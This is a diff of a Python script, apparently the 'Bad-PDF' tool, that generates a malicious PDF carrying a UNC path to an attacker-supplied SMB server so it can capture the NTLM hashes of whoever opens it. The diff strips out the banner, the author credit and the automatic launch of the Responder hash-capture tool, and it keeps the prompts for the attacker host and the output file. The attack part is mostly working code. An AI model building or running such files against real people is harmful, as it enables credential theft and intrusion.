@@ -3,25 +3,6 @@
 from __future__ import print_function
 import io
 import os
-import subprocess
-"""" 
-====================================================================================================================
-        ______                 __       _______  ______   ________  
-        |_   _ \               |  ]     |_   __ \|_   _ `.|_   __  | 
-          | |_) |  ,--.    .--.| | ______ | |__) | | | `. \ | |_ \_| 
-          |  __'. `'_\ : / /'`' ||______||  ___/  | |  | | |  _|    
-         _| |__) |// | |,| \__/  |       _| |_    _| |_.' /_| |_     
-        |_______/ '-;__/ '.__.;__]     |_____|  |______.'|_____|
-        
-        This is tool use technique disclosed by the check point team to steal the NTLM hash using malicious PDF file.
-        Author : Deepu TV ; Alias DeepZec
-====================================================================================================================        
-"""
-
-responder = '/usr/sbin/responder'
-interface = 'eth0'
-RED, WHITE, CYAN, GREEN, END = '\033[91m', '\33[46m', '\033[36m', '\033[1;32m', '\033[0m'
-
 
 def create_malpdf(filename, host):
     print("[*] Starting Process.. [*]")
@@ -99,36 +80,11 @@ trailer
 if __name__ == "__main__":
 
     try:
-        print("""
-      
-        ______                 __       _______  ______   ________  
-        |_   _ \               |  ]     |_   __ \|_   _ `.|_   __  | 
-          | |_) |  ,--.    .--.| | ______ | |__) | | | `. \ | |_ \_| 
-          |  __'. `'_\ : / /'`\' ||______||  ___/  | |  | | |  _|    
-         _| |__) |// | |,| \__/  |       _| |_    _| |_.' /_| |_     
-        |_______/ \'-;__/ '.__.;__]     |_____|  |______.'|_____|
-
-        Author : Deepu TV ; Alias DeepZec 
-
-        =============================================================
-        """)
-
-
-        if os.path.isfile(responder):
-            print("Responder detected :%s" %responder )
-
-        else:
-            print("Responder not found..")
-            responder = raw_input("Please enter responder path (Default /usr/sbin/responder): \n")
-
-        host = raw_input("Please enter Bad-PDF host IP: \n")
+        host = raw_input("Please enter SMB Server IP: \n")
         filename = raw_input("Please enter output file name: \n")
-        interface = raw_input("Please enter the interface name to listen(Default eth0): \n")
         create_malpdf(filename, '\\\\' + '\\\\' + host + '\\\\')
 
         print("Bad PDF %s created" %filename)
-
-        subprocess.Popen(responder + ' -I ' + interface + ' -wF', shell=True).wait()
 
     except KeyboardInterrupt:
         exit(0)
